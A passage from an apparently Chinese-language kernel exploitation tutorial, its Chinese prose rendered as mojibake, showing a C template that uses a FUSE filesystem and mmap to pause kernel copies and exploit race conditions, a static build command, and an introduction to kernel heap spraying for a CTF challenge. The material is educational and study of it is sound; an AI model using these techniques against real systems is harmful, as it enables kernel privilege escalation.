class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_getattr</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-keyword">struct</span> stat *stbuf)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(path, <span class="hljs-string">&quot;/&quot;</span>)) &#123;<br>        stbuf-&gt;st_mode = <span class="hljs-number">0755</span> | S_IFDIR;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        stbuf-&gt;st_mode = <span class="hljs-number">0644</span> | S_IFREG;<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fuse_operations</span> <span class="hljs-title">a3fuse_ops</span> =</span> &#123;<br>    .readdir = a3fuse_readdir,<br>    .getattr = a3fuse_getattr,<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> fuse_main(argc, argv, &amp;a3fuse_ops, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œç¼–è¯‘ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">gcc a3fuse.c -o a3fuse -D_FILE_OFFSET_BITS=64 -lfuse</span><br></code></pre></td></tr></table></figure>

<p>æ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://s2.loli.net/2023/01/10/SWHjTioDVdtybIv.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>å½“ç„¶ï¼Œç”±äºæˆ‘ä»¬çš„ä¾‹ç¨‹æ²¡æœ‰å®ç° <code>open()</code>ã€<code>read()</code>ã€<code>write()</code> ç­‰å‡½æ•°ï¼Œè¿™é‡Œç›´æ¥å¯¹æ–‡ä»¶è¿›è¡Œè®¿é—®ä¼šæç¤ºé”™è¯¯ï¼š</p>
<p><img src="https://s2.loli.net/2023/01/10/gZF7Dtz6YOEvCUy.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>FUSE æ›´æ·±å…¥çš„ç”¨æ³•æˆ‘ä»¬å°±æš‚ä¸”ä¸æ·±å…¥å­¦ä¹ äº†ï¼Œæˆ‘ä»¬è¿™é‡Œä¸»è¦å…³æ³¨å¦‚ä½•åœ¨æ¡ä»¶ç«äº‰ä¸­åˆ©ç”¨ FUSE</p>
<h3 id="åˆ©ç”¨-FUSE-æ›¿ä»£-userfaultfd-è¿›è¡Œæ¡ä»¶ç«äº‰åˆ©ç”¨"><a href="#åˆ©ç”¨-FUSE-æ›¿ä»£-userfaultfd-è¿›è¡Œæ¡ä»¶ç«äº‰åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨ FUSE æ›¿ä»£ userfaultfd è¿›è¡Œæ¡ä»¶ç«äº‰åˆ©ç”¨"></a>åˆ©ç”¨ FUSE æ›¿ä»£ userfaultfd è¿›è¡Œæ¡ä»¶ç«äº‰åˆ©ç”¨</h3><p>è®©æˆ‘ä»¬é‡æ–°å®¡è§†å‰é¢æˆ‘ä»¬åˆ©ç”¨ userfaultfd åœ¨æ¡ä»¶ç«äº‰ä¸­åˆ©ç”¨çš„æµç¨‹çš„æœ¬è´¨ï¼š</p>
<ul>
<li>è®©è¿›ç¨‹åœ¨å†…æ ¸ä¸­è¿›è¡Œæ•°æ®æ‹·è´æ—¶æš‚åœï¼Œæ§åˆ¶æƒè½¬äº¤æˆ‘ä»¬çš„è‡ªå®šä¹‰å‡½æ•°ï¼Œæˆ‘ä»¬åœ¨è‡ªå®šä¹‰å‡½æ•°ä¸­å°†è¯¥å†…æ ¸å¯¹è±¡é‡æ–°åˆ†é…åˆ°åˆ«å¤„ï¼Œåœ¨æ¢å¤æ•°æ®æ‹·è´æ—¶ä¾¿èƒ½è¯»å†™å…¶ä»–å†…æ ¸ç»“æ„ä½“çš„æ•°æ®</li>
</ul>
<p>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯<strong>åˆ©ç”¨ FUSE æˆ‘ä»¬åŒæ ·å¯ä»¥å®ç°ç±»ä¼¼çš„æ•ˆæœ</strong>ï¼š</p>
<ul>
<li>æ³¨å†Œä¸€ä¸ªç”¨æˆ·ç©ºé—´æ–‡ä»¶ç³»ç»Ÿï¼Œä¸ºè¯»å†™ç­‰æ¥å£æ³¨å†Œå›è°ƒå‡½æ•°ï¼Œä½¿ç”¨ mmap å°†è¯¥æ–‡ä»¶ç³»ç»Ÿä¸­çš„ä¸€ä¸ªæ–‡ä»¶æ˜ å°„åˆ°å†…å­˜ä¸­</li>
<li>å½“è¿›ç¨‹åœ¨å†…æ ¸ä¸­è¯»å†™è¿™å— mmap å†…å­˜æ—¶ï¼Œ<strong>ä¾¿ä¼šè§¦å‘ç¼ºé¡µå¼‚å¸¸ï¼Œæ­¤æ—¶æ§åˆ¶æƒä¾¿ä¼šè½¬äº¤åˆ°æˆ‘ä»¬æ³¨å†Œçš„å›è°ƒå‡½æ•°å½“ä¸­</strong></li>
<li><strong>åœ¨å›è°ƒå‡½æ•°å½“ä¸­å®Œæˆæˆ‘ä»¬çš„æ¶æ„æ“ä½œ</strong>ï¼ˆä¾‹å¦‚å°†è¿›ç¨‹æ­£åœ¨è¯»å†™çš„å†…æ ¸å¯¹è±¡é‡æ–°åˆ†é…åˆ°åˆ«çš„ä½ç½®ï¼Œæˆ–æ˜¯è¦†å†™è¯¥å¯¹è±¡ä»¥æ”¹å˜ä¸€äº›ç‰¹å®šå±æ€§ï¼‰</li>
<li>é‡æ–°å›åˆ°å†…æ ¸ä¸­çš„è¯»å†™æµç¨‹ï¼Œæ­¤æ—¶è¿›ç¨‹ä¾¿ä¼šæŒ‰ç…§æˆ‘ä»¬æ”¹å˜åçš„å†…æ ¸å¯¹è±¡<strong>è¿›è¡Œæ¶æ„æ“ä½œ</strong>ï¼ˆä¾‹å¦‚æˆ‘ä»¬åœ¨ FUSE çš„å›è°ƒå‡½æ•°ä¸­å°†è¯¥å¯¹è±¡é‡æ–°åˆ†é…åˆ°æŸä¸ªå‡½æ•°æŒ‡é’ˆï¼Œæ¢å¤åˆ°å†…æ ¸çš„è¯»å†™è¿‡ç¨‹æ—¶è¿›ç¨‹ä¾¿ä¼šè¦†å†™æ‰è¯¥å‡½æ•°æŒ‡é’ˆï¼‰</li>
</ul>
<p>åˆ©ç”¨ FUSEï¼Œæˆ‘ä»¬å¯ä»¥åƒ userfaultfd é‚£æ ·<strong>åˆ©ç”¨æ¡ä»¶ç«äº‰æ¼æ´å®Œæˆåˆ©ç”¨</strong>ï¼Œä¸å¹¸çš„æ˜¯å¸¸è§„çš„ libfuse åº“å¹¶ä¸æ”¯æŒé™æ€ç¼–è¯‘ï¼Œè¿™ä½¿å¾—æˆ‘ä»¬æ— æ³•åƒä»¥å¾€ä¸€æ ·å…ˆé™æ€ç¼–è¯‘ä¸€ä¸ª exp å†ä¼ åˆ°è¿œç¨‹ï¼Œ<strong>ä½†ä¸‡å¹¸çš„æ˜¯ libfuse åº“æ˜¯å¼€æºçš„</strong>ï¼Œå®‰å…¨ç ”ç©¶å‘˜ BitsByWill å’Œ D3v17 å°†å…¶è¿›è¡Œäº†ä¸€äº›è£å‰ªï¼ˆè£å‰ªæ‰äº† dlopen ç­‰ï¼Œä½†è¿˜æ˜¯å¾ˆå¤§â€¦ï¼‰ï¼Œåšäº†ä¸€ä¸ªå¯ä»¥ä¾›é™æ€ç¼–è¯‘çš„ <a target="_blank" rel="noopener" href="https://github.com/Crusaders-of-Rust/CVE-2022-0185/blob/master/libfuse3.a">libfuse3.a</a> åŠç›¸å…³çš„å¤´æ–‡ä»¶ç­‰ï¼ˆå‚è§<a target="_blank" rel="noopener" href="https://github.com/Crusaders-of-Rust/CVE-2022-0185">è¿™é‡Œ</a>ï¼‰</p>
<p>ä»¥ä¸‹æ˜¯ç¬”è€…ç¼–å†™çš„ FUSE åˆ©ç”¨çš„æ¨¡æ¿ï¼Œå’Œç¤ºä¾‹ç¨‹åºç›¸æ¯”ï¼Œæˆ‘ä»¬éœ€è¦å¯¹ä¸€äº›æ¥å£è¿›è¡Œå¾®è°ƒï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> FUSE_USE_VERSION 34</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fuse.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EVIL_FILE_NAME <span class="hljs-string">&quot;a3fuse_evil_file&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EVIL_DAEMON_NAME <span class="hljs-string">&quot;evil_fuse&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EVIL_MOUNT_PATH <span class="hljs-string">&quot;./evil&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EVIL_FILE_PATH EVIL_MOUNT_PATH <span class="hljs-string">&quot;/&quot;</span> EVIL_FILE_NAME</span><br><br><span class="hljs-type">char</span> *evil_args[] = &#123;EVIL_DAEMON_NAME, EVIL_MOUNT_PATH, <span class="hljs-literal">NULL</span>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_readdir</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-type">void</span>* buf, </span><br><span class="hljs-params">                               <span class="hljs-type">fuse_fill_dir_t</span> filler, <span class="hljs-type">off_t</span> offset, </span><br><span class="hljs-params">                               <span class="hljs-keyword">struct</span> fuse_file_info* fi, </span><br><span class="hljs-params">                               <span class="hljs-keyword">enum</span> fuse_readdir_flags flags)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_getattr</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-keyword">struct</span> stat *stbuf, </span><br><span class="hljs-params">                               <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_read</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                            <span class="hljs-type">off_t</span> offset, <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_write</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                             <span class="hljs-type">off_t</span> offset, <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span>;<br><br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fuse_operations</span> <span class="hljs-title">a3fuse_evil_ops</span> =</span> &#123;<br>    .readdir = a3fuse_evil_readdir,<br>    .getattr = a3fuse_evil_getattr,<br>    .read = a3fuse_evil_read,<br>    .write = a3fuse_evil_write,<br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_readdir</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-type">void</span>* buf, </span><br><span class="hljs-params">                               <span class="hljs-type">fuse_fill_dir_t</span> filler, <span class="hljs-type">off_t</span> offset, </span><br><span class="hljs-params">                               <span class="hljs-keyword">struct</span> fuse_file_info* fi, </span><br><span class="hljs-params">                               <span class="hljs-keyword">enum</span> fuse_readdir_flags flags)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(path, <span class="hljs-string">&quot;/&quot;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> -ENOENT;<br>    &#125;<br><br>    filler(buf, <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    filler(buf, <span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    filler(buf, EVIL_FILE_PATH, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_getattr</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-keyword">struct</span> stat *stbuf, </span><br><span class="hljs-params">                               <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(path, <span class="hljs-string">&quot;/&quot;</span>)) &#123;<br>        stbuf-&gt;st_mode = <span class="hljs-number">0755</span> | S_IFDIR;<br>        stbuf-&gt;st_nlink = <span class="hljs-number">2</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(path + <span class="hljs-number">1</span>, EVIL_FILE_PATH)) &#123;<br>        stbuf-&gt;st_mode = <span class="hljs-number">0644</span> | S_IFREG;<br>        stbuf-&gt;st_nlink = <span class="hljs-number">1</span>;<br>        stbuf-&gt;st_size = <span class="hljs-number">0x1000</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> -ENOENT;<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_read</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                            <span class="hljs-type">off_t</span> offset, <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span><br>&#123;<br>    <span class="hljs-comment">/* I only set one page there */</span><br>    <span class="hljs-type">char</span> evil_buf[<span class="hljs-number">0x1000</span>];<br>    <br>    <span class="hljs-keyword">if</span> (offset &gt;= <span class="hljs-number">0x1000</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (offset + size &gt; <span class="hljs-number">0x1000</span>) &#123;<br>        size = <span class="hljs-number">0x1000</span> - offset;<br>    &#125;<br>    <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * fill your buffer with needed data there</span><br><span class="hljs-comment">     * this&#x27;s an example, filling it simply with &#x27;A&#x27;</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">memset</span>(evil_buf, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">0x1000</span>);<br>    <br>    <span class="hljs-built_in">memcpy</span>(buf, evil_buf + offset, size);<br>    <br>    <span class="hljs-comment">/* now you can do anything useful for exploit there */</span><br>    <span class="hljs-comment">/* Your code here: */</span><br>    <br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_write</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                             <span class="hljs-type">off_t</span> offset, <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span><br>&#123;<br>    <span class="hljs-comment">/* I only set one page there */</span><br>    <span class="hljs-type">char</span> evil_buf[<span class="hljs-number">0x1000</span>];<br>    <br>    <span class="hljs-keyword">if</span> (offset &gt;= <span class="hljs-number">0x1000</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (offset + size &gt; <span class="hljs-number">0x1000</span>) &#123;<br>        size = <span class="hljs-number">0x1000</span> - offset;<br>    &#125;<br><br>    <span class="hljs-built_in">memcpy</span>(evil_buf + offset, buf, size);<br>    <br>    <span class="hljs-comment">/* now you can do anything useful for exploit there */</span><br>    <span class="hljs-comment">/* Your code here: */</span><br>    <br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">fuse_exploit_sample</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> *nearby_page, *evil_page;<br>    <span class="hljs-type">int</span> evil_file_fd;<br><br>    <span class="hljs-keyword">if</span> ((evil_file_fd = open(EVIL_FILE_PATH, O_RDWR)) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to open evil file in FUSE!&quot;</span>);<br>    &#125;<br><br>    nearby_page = mmap((<span class="hljs-type">void</span>*)<span class="hljs-number">0x1337000</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, <br>                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    evil_page = mmap((<span class="hljs-type">void</span>*)<span class="hljs-number">0x1338000</span>, <span class="hljs-number">0x1000</span>,  PROT_READ | PROT_WRITE, <br>                     MAP_SHARED | MAP_FIXED, evil_file_fd, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (evil_page != (<span class="hljs-type">void</span>*)<span class="hljs-number">0x1338000</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to map for FUSE file!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/** </span><br><span class="hljs-comment">     * now try reading or writing through nearby_page and evil_page in kernel, </span><br><span class="hljs-comment">     * the a3fuse_evil_read/a3fuse_evil_write will be triggered automatically</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-comment">/* Your code here: */</span><br>    <br>    munmap(nearby_page, <span class="hljs-number">0x1000</span>);<br>    munmap(evil_page, <span class="hljs-number">0x1000</span>);<br>    close(evil_file_fd);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-comment">/* register for FUSE */</span><br>    fuse_main(<span class="hljs-keyword">sizeof</span>(evil_args) / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>*) - <span class="hljs-number">1</span>, evil_args, <br>              &amp;a3fuse_evil_ops, <span class="hljs-literal">NULL</span>);<br>    <br>    <span class="hljs-comment">/* Your exploit here: */</span><br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>åŒæ—¶éœ€è¦åœ¨ç¼–è¯‘é€‰é¡¹ä¸­æ·»åŠ  <code>-I ./libfuse</code> ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">gcc -no-pie -static exp.c -I ./libfuse libfuse3.a -o exp -masm=intel -pthread -D_FILE_OFFSET_BITS=64</span><br></code></pre></td></tr></table></figure>

<h3 id="FUSE-in-CTF"><a href="#FUSE-in-CTF" class="headerlink" title="FUSE in CTF"></a><em>FUSE in CTF</em></h3><p>è™½ç„¶æˆ‘ä»¬æœ‰äº†å¯ä»¥é™æ€ç¼–è¯‘çš„ libfuse åº“ï¼Œä½†åœ¨ CTF çš„ kernel pwn è¿™æ ·â€æ®‹ç¼ºâ€œçš„ç¯å¢ƒå½“ä¸­æˆ‘ä»¬é€šå¸¸æ˜¯æ— æ³•ä½¿ç”¨ FUSE çš„ï¼Œå› è€Œå°±æ— æ³•ä½¿ç”¨è¿™ç§åˆ©ç”¨æ‰‹æ³•ï¼š(</p>
<p><img src="https://s2.loli.net/2023/01/11/lMx5TnkEivWryFX.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><img src="https://s2.loli.net/2023/01/15/e12LwEHGJmXjpx5.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><img src="https://s2.loli.net/2023/01/15/LcHPW1EVi7A6rwK.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<blockquote>
<p>ä¸è¿‡å¯ä»¥åœ¨å®Œå¤‡çš„çœŸå®ç¯å¢ƒä¸­ä½¿ç”¨è¿™ç§åˆ©ç”¨æ‰‹æ³• : ï¼‰</p>
</blockquote>
<h1 id="0x06-Kernel-Heap-Heap-Spraying"><a href="#0x06-Kernel-Heap-Heap-Spraying" class="headerlink" title="0x06.Kernel Heap - Heap Spraying"></a>0x06.Kernel Heap - Heap Spraying</h1><p><strong>å †å–·å°„</strong>ï¼ˆheap sprayingï¼‰æŒ‡çš„æ˜¯ä¸€ç§è¾…åŠ©æ”»å‡»æ‰‹æ³•ï¼šã€Œ<strong>é€šè¿‡å¤§é‡åˆ†é…ç›¸åŒçš„ç»“æ„ä½“æ¥è¾¾æˆæŸç§ç‰¹å®šçš„å†…å­˜å¸ƒå±€</strong>ï¼Œä»è€Œå¸®åŠ©æ”»å‡»è€…å®Œæˆåç»­çš„åˆ©ç”¨è¿‡ç¨‹ã€ï¼Œå¸¸è§äºå¦‚ä¸‹åœºæ™¯ï¼š</p>
<ul>
<li>ä½ æœ‰ä¸€ä¸ª UAFï¼Œä½†æ˜¯<strong>ä½ æ— æ³•é€šè¿‡å°‘é‡å†…å­˜åˆ†é…æ‹¿åˆ°è¯¥ç»“æ„ä½“</strong>ï¼ˆä¾‹å¦‚è¯¥ object ä¸å±äºå½“å‰ freelist ä¸”é‡Šæ”¾åä¼šå›åˆ° node ä¸Šï¼Œæˆ–æ˜¯åƒ <code>add_key()</code> é‚£æ ·ä¼šè¢«ä¸€ç›´å¡åœ¨ç¬¬ä¸€ä¸ªä¸´æ—¶ç»“æ„ä½“ä¸Šï¼‰ï¼Œè¿™æ—¶ä½ å¯ä»¥<strong>é€šè¿‡å †å–·å°„æ¥ç¡®ä¿æ‹¿åˆ°è¯¥ object</strong></li>
<li>ä½ æœ‰ä¸€ä¸ªå †æº¢å‡ºè¯»&#x2F;å†™ï¼Œä½†æ˜¯<strong>å †å¸ƒå±€å¯¹ä½ è€Œè¨€æ˜¯ä¸å¯çŸ¥çš„</strong>ï¼ˆæ¯”å¦‚è¯´å¼€å¯äº† <code>SLAB_FREELIST_RANDOM</code>ï¼ˆé»˜è®¤å¼€å¯ï¼‰ï¼‰ï¼Œä½ å¯ä»¥<strong>é¢„å…ˆå–·å°„å¤§é‡ç‰¹å®šç»“æ„ä½“ï¼Œä»è€Œä¿è¯å¯¹å…¶ä¸­æŸä¸ªç»“æ„ä½“çš„æº¢å‡º</strong></li>
<li>â€¦â€¦</li>
</ul>
<p>ä½œä¸ºä¸€ç§è¾…åŠ©çš„æ”»å‡»æ‰‹æ³•ï¼Œå †å–·å°„å¯ä»¥è¢«åº”ç”¨åœ¨å¤šç§åœºæ™¯ä¸‹</p>
<h2 id="ä¾‹é¢˜ï¼šRWCTF2023ä½“éªŒèµ›-Digging-into-kernel-3"><a href="#ä¾‹é¢˜ï¼šRWCTF2023ä½“éªŒèµ›-Digging-into-kernel-3" class="headerlink" title="ä¾‹é¢˜ï¼šRWCTF2023ä½“éªŒèµ› - Digging into kernel 3"></a>ä¾‹é¢˜ï¼šRWCTF2023ä½“éªŒèµ› - Digging into kernel 3</h2><blockquote>
<p>å’Œå»å¹´ä¸€æ ·éƒ½æ˜¯ç™½ç»™é¢˜ï¼Œç„¶åå’Œå»å¹´ä¸€æ ·æ‘†çƒ‚åŠå¤©æ‹¿ä¸‰è¡€ :-D</p>
<blockquote>
